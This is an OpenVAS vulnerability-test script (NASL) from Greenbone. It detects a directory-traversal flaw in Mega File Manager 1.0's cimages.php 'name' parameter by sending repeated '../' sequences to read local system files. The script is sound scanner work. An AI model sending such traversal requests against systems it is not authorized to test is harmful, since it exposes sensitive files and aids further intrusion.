###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_megafilemanager_53189.nasl 5641 2017-03-21 08:24:30Z cfi $
#
# Mega File Manager 'name' Parameter Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Mega File Manager is prone to a directory-traversal vulnerability
because it fails to properly sanitize user-supplied input.

Remote attackers can use specially crafted requests with directory-
traversal sequences ('../') to retrieve arbitrary files in the context
of the application.

Exploiting this issue may allow an attacker to obtain sensitive
information that could aid in further attacks.

Mega File Manager 1.0 is vulnerable; other versions may also be
affected.";


if (description)
{
 script_id(103477);
 script_bugtraq_id(53189);
 script_version ("$Revision: 5641 $");

 script_name("Mega File Manager 'name' Parameter Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53189");
 script_xref(name : "URL" , value : "http://www.awesomephp.com/?MegaFileManager");

 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:24:30 +0100 (Tue, 21 Mar 2017) $");
 script_tag(name:"creation_date", value:"2012-04-25 10:11:55 +0200 (Wed, 25 Apr 2012)");
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/megafilemanager","/MegaFileManager",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/index.php"); 

  if(http_vuln_check(port:port, url:url,pattern:"Powered by Awesome PH")) {

    files = traversal_files();
    foreach file (keys(files)) {

      url = dir + '/cimages.php?name=' + crap(data:"../", length:9*6) + files[file];

      if(http_vuln_check(port:port, url:url,pattern:file)) {
        security_message(port:port);
        exit(0);
      }  

    }  

  }
}

exit(0);
